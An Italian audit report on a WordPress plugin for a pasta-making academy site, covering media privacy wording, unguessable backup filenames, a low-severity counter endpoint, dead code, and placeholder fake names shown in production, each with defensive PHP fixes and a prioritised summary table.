Il "problema" era **solo** lo scarto tra quello che i testi promettevano e quello che il
codice faceva. Tolta la promessa, non resta niente da difendere: le foto delle sfoglie
sono già pubbliche per costruzione (Galleria, Vetrina), e quelle del Tavolo di Lavoro
sono foto di sfoglia stesa, non documenti personali. Un indirizzo lungo e non pubblicizzato
è una protezione proporzionata a quel contenuto.

Questo è **il modo giusto di chiudere un rilievo di sicurezza**: non tutto ciò che è
raggiungibile è un problema. Lo diventa quando qualcuno si è fidato di una promessa
diversa.

### Cosa resta da fare, ed è poco

**1 · Allineare i testi — è l'unica cosa necessaria.**
Nel riquadro del Tavolo di Lavoro la sezione è presentata come *"foto del giorno,
privata"*. La parola «privata» promette più di quanto il sito mantenga e va sostituita.
Formula suggerita: **«la vedono solo le sfogline iscritte e i maestri»** — vera, chiara,
e non fa promesse sul file.

Cercare la parola in `includes/tavolo.php` (testo di `gs_sezione_aiuto()`) e nel
docblock in cima al file, e correggere entrambe. **Da proporre a Ennio prima di
applicare**: è testo che leggono le sfogline, non codice.

**2 · Bloccare le pagine allegato — facoltativa, ma conviene.**
Indipendentemente dalla riservatezza, oggi `?attachment_id=N` (se attivo sul tema in uso)
permette di sfogliare **tutti** i media del sito con un contatore. Anche per contenuti non
segreti è una porta che non serve a niente: nessuna pagina del plugin usa le pagine
allegato. Chiuderla costa dieci righe e toglie una via di enumerazione:

```php
add_action( 'template_redirect', 'gs_blocca_pagine_allegato' );
function gs_blocca_pagine_allegato() {
    if ( ! is_attachment() ) {
        return;
    }
    if ( function_exists( 'gs_can_manage' ) && gs_can_manage() ) {
        return; // chi gestisce continua a vederle dal wp-admin
    }
    wp_safe_redirect( home_url( '/' ), 301 );
    exit;
}
```

**Priorità bassa**, in fondo al Blocco E. Prima verificare su Local che nessuna pagina del
sito usi i link agli allegati, altrimenti si rompono dei collegamenti.

### Un limite di questa decisione, da rileggere se cambia qualcosa

La risposta di Ennio riguardava **le foto del Tavolo di Lavoro**. Gli allegati passano
tutti dallo stesso tubo (`gs_msg_upload()`, `includes/media-msg.php:16`), quindi la stessa
conclusione si estende automaticamente a: foto e video dei **messaggi privati**, audio del
**Matterello Parlante**, media del **Diario**, allegati delle **conversazioni con gli
esperti** (quelle a pagamento, con i token).

**Presumi che valga per tutti** — è la lettura ragionevole della risposta, ed è quella da
seguire. Ma se in futuro qualcuno chiede di allegare un documento davvero personale a una
consulenza privata, **quel giorno il discorso si riapre**, perché il tubo è lo stesso e la
protezione è la stessa: nessuna. Lasciato scritto qui perché la prossima revisione lo
ritrovi invece di riscoprirlo da capo.

## F3 · La protezione dei backup: non stare a indovinare, cambia il nome del file

**File:** `includes/media-backup.php:108-122` (`gs_backup_prepara_dir()`),
`includes/media-backup.php:143` (nome del file)
**Stato:** meccanismo VERIFICATO; l'ambiente resta incerto — **e la conclusione è che non
conviene accertarlo.**

### Il fatto

La cartella dei backup è protetta scrivendoci dentro un `.htaccess` con `Deny from all`.
**`.htaccess` è un file di configurazione di Apache: nginx lo ignora completamente.**
Se i file `.zip` sono serviti da nginx senza passare da Apache, quella protezione non
esiste — e i backup contengono **tutte le foto delle sfoglie**, comprese quelle nel cestino.

Il nome è prevedibile: `backup-AAAA-MM-GG-HHMMSS.zip`. Nota una data e ti restano 86.400
possibilità: poche ore di tentativi automatici.

### Sull'hosting — chiarimento del 22/08/2026

Ennio ha risposto «hosting SeedProd». **SeedProd non è un hosting: è un plugin WordPress**
per pagine di atterraggio e modalità "sito in costruzione". Probabilmente è installato sul
sito, ma non dice niente su dove il sito è ospitato.

**L'indizio vero è nella schermata che Ennio ha mandato**: nella barra di amministrazione
in alto si legge **«Pulisci la Cache SG»**, che è il pulsante del plugin *SiteGround
Optimizer*. **Il sito è quasi certamente su SiteGround.**

E qui sta il punto: **SiteGround non dà una risposta netta.** Il loro stack mette nginx
davanti ad Apache — le richieste PHP passano da Apache (quindi `.htaccess` funziona), ma i
**file statici**, e uno `.zip` lo è, possono essere consegnati direttamente da nginx senza
mai arrivare ad Apache. Dipende dalla configurazione del singolo piano, e cambia nel tempo
senza che il cliente ne sia informato.

### Conclusione operativa: rendere la domanda irrilevante

Accertare la configurazione richiede una prova sul sito vero, e **la risposta potrebbe
cambiare al prossimo aggiornamento dell'hosting, senza preavviso.** Una protezione che
dipende da come è configurato il server oggi non è una protezione: è una scommessa.

**Correzione: dare al backup un nome che non si può indovinare.** Mezz'ora di lavoro, e
funziona identica su Apache, su nginx e su qualunque cosa SiteGround decida domani.

In `gs_run_backup()`, riga 143:

```php
$nome = 'backup-' . date( 'Y-m-d-His' ) . '-' . wp_generate_password( 16, false ) . '.zip';
```

Poi **adeguare i due punti che riconoscono quel nome**, altrimenti i backup nuovi
diventano invisibili e non scaricabili:

1. `gs_ajax_fe_backup_download()`, riga 275 — il controllo del nome:
   ```php
   if ( ! preg_match( '/^backup-[0-9-]+-[A-Za-z0-9]{16}\.zip$/', $nome ) ) { wp_die( 'File non valido.' ); }
   ```
   Tenere anche il vecchio schema in alternativa (`|^backup-[0-9-]+\.zip$`), altrimenti i
   backup già presenti sul sito smettono di essere scaricabili.
2. `gs_backup_lista()` — verificare che il filtro con cui elenca i file della cartella
   accetti il nome nuovo. **Provarlo su Local prima di consegnare: è il punto che si rompe
   se qualcosa va storto.**

Lasciare il `.htaccess` dov'è: su Apache continua a fare il suo lavoro, e non dà fastidio
altrove. Le due protezioni si sommano.

### Mentre ci sei: far dire alla Diagnostica su cosa gira il sito

Nella prima stesura avevo scritto che il web server si legge dalla Diagnostica.
**Non è vero: `includes/diagnostica.php` non lo mostra** (controlla cron, permalink,
pagine, cartella caricamenti, ZipArchive, GD, mbstring, ffmpeg — non il server).

Visto che la domanda è saltata fuori e tornerà, aggiungere una riga a `gs_diag_stato()`
costa sei righe e la chiude per sempre:

```php
$server = isset( $_SERVER['SERVER_SOFTWARE'] ) ? sanitize_text_field( wp_unslash( $_SERVER['SERVER_SOFTWARE'] ) ) : '';
$righe[] = array(
    'label'     => 'Web server',
    'stato'     => $server ? 'ok' : 'warn',
    'dettaglio' => $server ? $server : 'Non dichiarato dal server.',
);
```

Utile ben oltre i backup: è la prima cosa che serve sapere ogni volta che qualcosa si
comporta diversamente dal previsto sull'hosting.

## F4 · Minore — chiunque sia collegato può gonfiare il contatore di lettura dell'Aeroplanino

**File:** `includes/volo-notifiche.php:821-834` — VERIFICATO, severità bassa

`gs_ajax_aeroplanino_click` verifica il nonce ma **non chi chiama**, e usa l'`id`
ricevuto dal POST senza validarlo, per un `UPDATE` diretto:

```php
$wpdb->query( $wpdb->prepare(
    "UPDATE {$wpdb->options} SET option_value = option_value + 1 WHERE option_name = %s",
    'gs_aereo_click_' . $id
) );
```

La query è correttamente preparata (**nessuna SQL injection**) e tocca solo righe che
già esistono. Ma qualsiasi utente collegato può ripetere la chiamata quante volte vuole,
gonfiando a piacere il numero di "quante sfogline hanno letto" un dato messaggio.
L'unico danno è che Ennio guarda un numero falso.

**Correzione:** un usermeta `gs_aereo_click_visti` con l'elenco degli id già cliccati da
quell'utente, e conteggiare solo il primo clic di ciascuno. Cinque righe. Priorità bassa,
ma è l'unico endpoint di scrittura senza controllo di identità in tutto il plugin.

---

# BLOCCO G — Codice morto

Su un progetto arrivato alla 3.271 dopo circa 270 rilasci ce n'è meno del previsto.
**Fare questo blocco per ultimo**, quando tutto il resto è in produzione e stabile:
è il lavoro col rapporto beneficio/rischio peggiore.

## G1 · Dieci funzioni definite e mai richiamate

**Stato:** VERIFICATO (nessun riferimento in PHP né in JS oltre alla definizione)

| File:riga | Funzione |
|---|---|
| `calendario.php:431` | `gs_cal_totale_cliente()` |
| `caroselli.php:48` | `gs_carosello_html()` |
| `caroselli.php:88` | `gs_carosello_scheda_html()` |
| `helpers.php:75` | `gs_categoria_colore()` |
| `inbox.php:58` | `gs_inbox_non_letti()` |
| `secret-ingredient.php:52` | `gs_ingrediente_annunciato_da()` |
| `mail-area-riservata.php:293` | `gs_mail_area_riservata_html()` |
| `sconto-corsi.php:84` | `gs_sconto_log_get()` |
| `scuole-cucina.php:129` | `gs_scu_is_scuola()` |
| `scuole-cucina.php:157` | `gs_scu_pannello_url()` |

**Prima di cancellare, due domande da porre a Ennio:**

- **`gs_inbox_non_letti()`** e **`gs_sconto_log_get()`** non sembrano avanzi: sembrano
  **funzionalità mai collegate**. La Posta interna non mostra un contatore di non letti;
  lo storico dello sconto corsi non è visibile da nessuna parte (quello del Buono
  Sfoglia sì, `buono-sfoglia.php:266`). Prima di cancellarle, chiedere se erano
  *dimenticate* o *rinviate*. Cancellare una funzione che serviva a una cosa che manca
  è il modo di far sparire per sempre quella cosa.
- Le altre otto sono avanzi con ogni probabilità sicuri.

**Correzione:** cancellarle una alla volta, con `php -l` dopo ognuna, e un solo commit
per tutto il blocco così è facile tornare indietro.

## G2 · Otto nomi inventati, VISIBILI ADESSO su /le-sfogline/

> **AGGIORNATO IL 22/08/2026 — QUESTO NON È PIÙ CODICE MORTO, È IN VETRINA.**
> Ennio ha mandato la schermata di `accademiadellasfoglia.it/le-sfogline/`. I nomi che
> si leggono nel nastro grande sono **Elena Marchetti, Paola Ricci, Anna Conti, Federica
> Bianchi, Silvia Ferraris, Chiara Bellini** — cioè `$nomi_demo`, i nomi inventati.
> **Riempiono la pagina**: le sfogline vere con Vetrina attiva sono poche e finiscono in
> testa all'elenco, i falsi sono appesi in coda e occupano la parte che si vede.
> **Sposta questo punto in cima alla lista, insieme ad A3: non è manutenzione, è una
> pagina pubblica che presenta persone che non esistono.**

**File:** `includes/nastro-vetrine.php:239-264` — VERIFICATO nel codice **e confermato
in produzione da schermata**.

### Quanto sono presenti

`$sfogline` viene montato così: prima le sfogline vere (`get_users()` + filtri), **poi in
coda gli otto nomi finti**, senza riordinare. Poi ogni riga stampa l'elenco intero due
volte (`for ( $giro = 0; $giro < 2; $giro++ )`), su **tre righe** (`$righe`, riga 289).

**Otto nomi × 2 giri × 3 righe = 48 pillole finte** in una sola pagina. Ognuna con
`'url' => '#'`: sono anche link morti, che non portano da nessuna parte.

### Correzione

Due cancellazioni, righe 259-264: l'array `$nomi_demo` e il ciclo che lo unisce a
`$sfogline`. Nient'altro. Il `if ( ! $sfogline ) { return ''; }` alla riga 266 gestisce
già il caso in cui, tolti i falsi, non resti nessuno: il nastro grande semplicemente non
compare, invece di comparire vuoto.

**È l'unica voce di tutto il documento che si può applicare senza aspettare risposte**:
il commento nel codice dice già *"vanno tolti… non appena Ennio lo chiede"*, e la
schermata è la richiesta. Fallo per primo — è una cancellazione, non può rompere niente,
e toglie subito dal sito pubblico l'unica cosa che non dovrebbe esserci.

Il codice contiene otto nomi di sfogline **inventati** che vengono aggiunti al Nastro
Grande delle Vetrine ("Marta Colombo", "Federica Bianchi", "Silvia Ferraris",
"Chiara Bellini", "Elena Marchetti", "Paola Ricci", "Anna Conti", "Laura Moretti").

Il commento sopra è esplicito e onesto: è una **deroga temporanea concessa da Ennio il
17/08/2026**, per vedere il nastro pieno prima che ci fossero abbastanza sfogline vere,
e dice testualmente *"vanno tolti… non appena Ennio lo chiede"*.

Sono passati cinque giorni, il codice è in produzione alla 3.271.0 **e la schermata del
22/08/2026 mostra che quei nomi sono la cosa più visibile della pagina «Le Sfogline»**.

## G2-bis · Le righe 1 e 3 del nastro grande sono identiche e sincronizzate

**File:** `includes/nastro-vetrine.php:286-292` — VERIFICATO nel codice, **visibile nella
schermata**

```php
$righe = array(
    array( 'etichetta' => 'sx' ),
    array( 'etichetta' => 'dx' ),
    array( 'etichetta' => 'sx' ),   // ← stessa direzione e stesso contenuto della prima
);
```

Tutte e tre le righe stampano **lo stesso array `$sfogline`, nello stesso ordine, con la
stessa `animation-duration:150s`**. La seconda scorre al contrario, quindi si distingue.
La prima e la terza no: stessa direzione, stesso contenuto, stessa durata, partite nello
stesso istante — **sono copie perfettamente sovrapposte**.

Nella schermata si vede chiaramente: riga 1 e riga 3 mostrano *"…Bellini · Elena Marchetti
· Paola Ricci · Ann…"* nelle identiche posizioni. Non sembra un effetto voluto: sembra la
pagina che si è disegnata due volte.

**Correzione:** dare alla terza riga uno sfasamento, non un contenuto diverso — basta un
ritardo negativo sull'animazione, che la fa partire a metà giro:

```php
$sfasamento = ( 2 === $i ) ? ';animation-delay:-75s' : '';   // metà di 150s
$out .= '<div class="gs-nastro-grande-pista' . $classe_verso . '" style="animation-duration:150s' . $sfasamento . '">';
```

(serve `foreach ( $righe as $i => $r )` invece di `foreach ( $righe as $r )`.)

**Attenzione:** `gaming.js` (`gsAllineaVelocitaNastroGrande`) riscrive
`animation-duration` misurando la larghezza vera. Se tocchi anche `animation-delay`,
verifica su Local che il JS non lo azzeri — in tal caso lo sfasamento va messo lì, non
nel PHP. **Priorità bassa: è un difetto estetico, non funzionale.** Da fare solo dopo G2,
perché togliendo gli otto nomi finti l'elenco si accorcia e il problema potrebbe
diventare più o meno evidente.

Da notare: lo shortcode `[gs_nastro_grande_sfogline]` non è richiamato da nessuna parte
nel plugin — **Ennio l'ha incollato a mano nella pagina «Le Sfogline»**, come confermato
dalla schermata. Non cercarlo nel codice: è contenuto della pagina, non del plugin.

## G3 · Chiavi usermeta che si accumulano per sempre

**Stato:** VERIFICATO — non è codice morto, sono dati morti

`gs_add_points()` (`points.php:22-120`) crea, per ogni utente, una riga di usermeta nuova
per ogni mese (`gs_points_mese_AAAA-MM`, riga 76) e due per ogni anno
(`gs_points_AAAA` riga 59, `gs_points_anno_AAAA` riga 92). **Nessuna viene mai
cancellata.** Con 200 sfogline sono circa 2.800 righe l'anno che non serviranno più.

Aggiungendo i marcatori di A1 (`gs_buono_mese_AAAA-MM`) diventano circa 5.200 l'anno.

**Correzione:** un compito su `gs_daily_cron` che, una volta l'anno, cancella i
`gs_points_mese_*` più vecchi di 24 mesi. Da fare **dopo** A1 e con lo stesso schema a
scaglioni, altrimenti si reintroduce esattamente il problema che A1 corregge.
**Priorità bassa:** su questa scala non è ancora un problema, ma va messo a calendario
prima che lo diventi.

## G4 · Classi CSS orfane — attenzione ai falsi positivi

**Stato:** DA VERIFICARE, e più delicato di quanto sembri

Un confronto meccanico tra le 633 classi `.gs-*` di `assets/css/gaming.css` e le
occorrenze in PHP e JS dà **72 candidate orfane**. **La maggior parte sono falsi
positivi**, perché il plugin compone i nomi di classe a pezzi:

```php
'gs-cm-rango-' . $posto        // classifica-mensile.php:107  → .gs-cm-rango-1/2/3
'gs-idx-grp-' . $g             // → .gs-idx-grp-corsi, -sfide, …
'gs-cal-tipo-' . $tipo         // → .gs-cal-tipo-corso, -esame, …
'gs-pro-colore-' . ( $i % 5 )  // → .gs-pro-colore-0…4
```

**Non cancellare nulla sulla base di quell'elenco.** Se e quando si vorrà fare questa
pulizia, l'unico metodo affidabile è: prendere ogni classe candidata, cercare **il suo
prefisso** (`gs-cm-rango`, non `gs-cm-rango-1`) in PHP e JS, e cancellare solo se **anche
il prefisso** non compare da nessuna parte. Il guadagno è qualche kilobyte di CSS;
il rischio è un pezzo di interfaccia che si scolora in un punto che nessuno riguarda
da mesi. **Consiglio: lasciare stare, e rimandare finché non c'è un motivo vero.**

---

# Riepilogo operativo

| # | Cosa | File | Gravità | Stato |
|---|---|---|---|---|
| A1 | Chiusura mese non idempotente → sconti doppi | `buono-sfoglia.php:69` | **Critico** | Verificato |
| A2 | Doppio clic brucia due livelli corso | `sconto-corsi.php:112` | **Alto** | Verificato · nuovo |
| **A3** | **Scansione utenti a ogni pagina del sito** | `nastro-vetrine.php:44` | **CRITICO** | **Confermato acceso** |
| A3-bis | Su /le-sfogline/ la scansione si fa due volte | `gaming.css:2174` | Alto | Verificato · nuovo |
| A4 | Classifica: `nopriv`, tutti gli utenti ogni 20 s | `classifica-mensile.php:65` | **Alto** | Verificato |
| A5 | 2 query/pagina + 5 polling a 15 s | `gaming-sfogline.php:576` | **Alto** | Verificato · nuovo |
| B1 | Premi di sfida assegnati due volte | `voting.php:631` | Alto | Verificato · nuovo |
| B2 | Token rimborsati due volte | `token.php:316` | Alto | Verificato · nuovo |
| B3 | Aeroplanini compleanno doppi | `compleanni.php:129` | Medio | Verificato · nuovo |
| B4 | Email Premio Fine Anno doppie | `year-prize.php:95` | Medio | Verificato · nuovo |
| B5 | Livello doppio → sconto doppio | `premi-traguardi.php:166` | Alto | Verificato · nuovo |
| B6 | Salto di due livelli salta un premio | `premi-traguardi.php:167` | Medio | Verificato · nuovo |
| C1 | Chiusura mese: un solo giorno utile | `buono-sfoglia.php:127` | Medio | Verificato |
| C2 | Scadenza: un solo giorno all'anno | `buono-sfoglia.php:220` | Medio | Verificato |
| C3 | Reset sconti: otto giorni utili | `sconto-corsi.php:139` | Basso | Verificato · nuovo |
| C4 | Promemoria corso: marcatore dopo il ciclo | `calendario.php:1663` | Basso | Verificato · nuovo |
| D1 | 5 permessi usati ma non registrati | `sezioni.php:21` | Medio | Verificato · nuovo |
| D2 | 3 interruttori "Visibile" inerti | `volo-notifiche.php:89` | Medio | Verificato · nuovo |
| D3 | 3 caselle Nastro salvate e mai lette | `nastro-vetrine.php:132` | Basso | Verificato · nuovo |
| E1 | `$corso` non definito, JSON a rischio | `calendario.php:779` | Medio | Verificato · nuovo |
| E2 | `esc_url()` in JSON | `classifica-mensile.php:73` | Basso | Verificato |
| E3 | `isset` mancanti nello storico | `buono-sfoglia.php:271` | Basso | Verificato |
| E4 | Buono applicato due volte sporca il log | `buono-sfoglia.php:196` | Basso | Verificato |
| E5 | Nonce scaduto = polling muto | `gaming.js` (6 punti) | Medio | Verificato · nuovo |
| E6 | CSV senza protezione formule | `export-dati.php:133` | Basso | Verificato · nuovo |
| **F1** | **Punti coltivabili scrivendo → Buono** | `forms.php:56,125` | **Alto** | Verificato · **deciso** |
| F2 | Foto raggiungibili da fuori | `media-msg.php:45` | — | **Chiuso: non sono riservate** |
| F3 | Nome del backup indovinabile | `media-backup.php:143` | Medio | Verificato · **deciso** |
| F4 | Contatore Aeroplanino gonfiabile | `volo-notifiche.php:821` | Basso | Verificato · nuovo |
| G1 | 10 funzioni mai chiamate | vari | Basso | Verificato |
| **G2** | **48 pillole con 8 nomi inventati, in vetrina** | `nastro-vetrine.php:260` | **CRITICO** | **Visto in produzione** |
| G2-bis | Righe 1 e 3 del nastro grande identiche | `nastro-vetrine.php:286` | Basso | Verificato · nuovo |
| G3 | Usermeta che si accumulano | `points.php:76` | Basso | Verificato · nuovo |
| G4 | 72 classi CSS candidate orfane | `gaming.css` | Basso | **Da verificare** |

---

# Domande e risposte

## Già risposte da Ennio (22/08/2026)

- **Il Nastro delle Vetrine è acceso?** **Sì**, in modalità a **corsia singola**, confermato
  a voce e da schermata. → A3 passa da "problema potenziale" a **prima correzione in assoluto**.
  Ricorda: la corsia singola **non ha ridotto il costo sul server** (vedi A3), solo l'HTML.
- **Gli otto nomi inventati si tolgono?** La schermata di `/le-sfogline/` li mostra come la
  cosa più visibile della pagina. → G2 diventa **la prima cosa da fare in assoluto**, prima
  ancora di A3: è una cancellazione di sei righe che non può rompere niente.
- **Che tetto mettere ai punti giornalieri?** Ennio ha confermato che oggi non c'è nessun
  tetto e **ha delegato la scelta**. → Decisa e scritta per esteso in F1: *«ogni cosa dà
  punti una volta al giorno»*, applicata alle sole due fonti scoperte (diario e consigli).
  Non toccare la soglia dei 2.500 finché non si è visto un mese vero.
- **Quanto sono private le foto del Tavolo di Lavoro?** Ennio, seconda risposta:
  *«le foto non sono cosa segreta»*. → **F2 è chiuso.** Il lavoro grosso (consegna
  protetta) **non va fatto**: resta solo da correggere la parola «privata» nei testi, più
  un blocco facoltativo delle pagine allegato. Vale per tutti gli allegati, non solo il Tavolo.
- **Su che hosting gira il sito?** Ennio ha detto «SeedProd», che però è un plugin, non un
  hosting. La sua schermata mostra «Pulisci la Cache SG»: **è SiteGround**, dove la
  risposta su `.htaccess` è ambigua per costruzione. → **F3 è chiuso senza bisogno di
  accertarlo**: si cambia il nome del backup in uno non indovinabile e la domanda diventa
  irrilevante su qualunque server.

## Ancora aperte — servono prima di scrivere il codice

1. **A2** — Dopo il marcatore sulla prenotazione, il gestore che sbaglia persona come
   annulla lo sconto applicato? Pulsante dedicato o correzione a mano dalla scheda?
2. **A5** — Va bene che palloncini e aeroplanini possano comparire fino a mezzo minuto
   dopo l'invio, invece di quindici secondi?
*(Nessun'altra domanda aperta: F2 e F3 sono state chiuse il 22/08/2026.)*

## Ordine di lavoro

**È in cima al documento**, nella sezione ORDINE DI LAVORO: sei giri, con il Giro 0 e il
Giro 1 scritti per esteso e i punti dove fermarsi. Questa sezione non lo ripete, per non
avere due elenchi che possono contraddirsi.

---

# Limiti di questa analisi

- **Il plugin non è stato eseguito.** Non c'è stata nessuna misurazione: i numeri sul
  carico (180 scansioni/ora in A4, 1.200-1.440 richieste/ora in A5) sono **calcolati
  dagli intervalli dichiarati nel codice**, non osservati su un sito vero. Se serve
  certezza, vanno misurati su Local con Query Monitor.
- **Il sito vero non è stato visitato**: il proxy di rete blocca `accademiadellasfoglia.it`.
  Le uniche osservazioni dirette sono **due schermate mandate da Ennio il 22/08/2026**, che
  documentano: il nastro piccolo acceso a corsia singola sotto il menu (con le pillole
  «Mulino Marino · Partner» ripetute tra un nome e l'altro, e sfogline vere come Bruno
  Cingolani e Giuseppe Govoni), e la pagina `/le-sfogline/` con il nastro grande a tre righe
  pieno dei nomi di `$nomi_demo`. Tutto il resto di questo documento viene dal codice.
- **Le otto correzioni della revisione precedente non sono state ricontrollate**: la
  revisione del 22/08/2026 le aveva verificate riga per riga e le dà tutte per corrette.
- L'analisi copre l'intero albero dei file (102 PHP, `gaming.js`, `gaming.css`) per gli
  incroci meccanici — endpoint AJAX, cron, chiavi di permesso, funzioni, opzioni, classi CSS.
  La lettura per intero, riga per riga, ha riguardato i moduli citati nelle voci qui sopra:
  `buono-sfoglia.php`, `classifica-mensile.php`, `sconto-corsi.php`, `premi-traguardi.php`,
  `token.php`, `year-prize.php`, `points.php`, `nastro-vetrine.php`, `sezioni.php`,
  `volo-notifiche.php` (parti rilevanti), `forms.php`, `antispam.php`, `media-backup.php`,
  `export-dati.php`, più le parti di `calendario.php`, `voting.php`, `compleanni.php`,
  `conversazioni.php`, `messaggi.php` e `gaming.js` collegate.
- **F2 e F3 sono state chiuse da Ennio il 22/08/2026** e contengono decisioni, non più
  domande: F2 dice esplicitamente di **non** fare la consegna protetta, F3 di **non** stare
  ad accertare la configurazione del server. Rispettarle come sono scritte.
- **G4 (classi CSS orfane) resta l'unica verifica non conclusa**, e il consiglio è di
  lasciarla stare: l'elenco meccanico è pieno di falsi positivi perché il plugin compone i
  nomi di classe a pezzi.

---

# Cosa serve da Local

Cinque prove, e nient'altro. Tutto il resto si legge dal codice e non ha bisogno di
essere eseguito.

1. **A1 — la prova che conta più di tutte.** Su un Local con una ventina di utenti finti:
   chiamare `gs_buono_sfoglia_chiudi_mese( '2026-07' )` a mano, **interromperla a metà**,
   richiamarla, e verificare che **nessuno riceva il 2,5% due volte**. Senza questa prova
   la correzione di A1 non è consegnabile.
2. **A3 — che la memoria funzioni davvero.** Con Query Monitor: caricare una pagina
   qualsiasi, annotare il numero di query; ricaricarla e verificare che il secondo
   caricamento ne faccia **molte di meno** (il transient sta lavorando). Poi aspettare la
   scadenza e controllare che si ricostruisca da solo.
3. **A3-bis — che «Le Sfogline» non faccia più il conto due volte.** Sulla pagina Le
   Sfogline, verificare con Query Monitor che dopo la correzione non ci sia più la
   scansione del nastro piccolo, e che il nastro grande continui a comparire.
4. **A4 e A5 — quanto costano davvero.** Query Monitor su una pagina con un utente
   collegato: quante query e quanti millisecondi consuma `gs_enqueue_assets()`, e quante
   una chiamata a `gs_conv_conteggio`. Serve a decidere se basta unificare gli endpoint o
   se va anche allungato l'intervallo.
5. **F3 — che i backup restino scaricabili.** Dopo aver cambiato il nome del file:
   creare un backup nuovo, verificare che compaia nell'elenco e che il pulsante «Scarica»
   funzioni, **e che funzioni ancora anche per un backup vecchio** col nome di prima.
   È il punto che si rompe più facilmente.

Una prova rapida che non richiede Local, ma il sito vero:

- **E1** — bloccare un corso dal pannello e verificare che il messaggio in Posta interna
  arrivi con il **titolo del corso** e non con «Corso bloccato: » e basta.
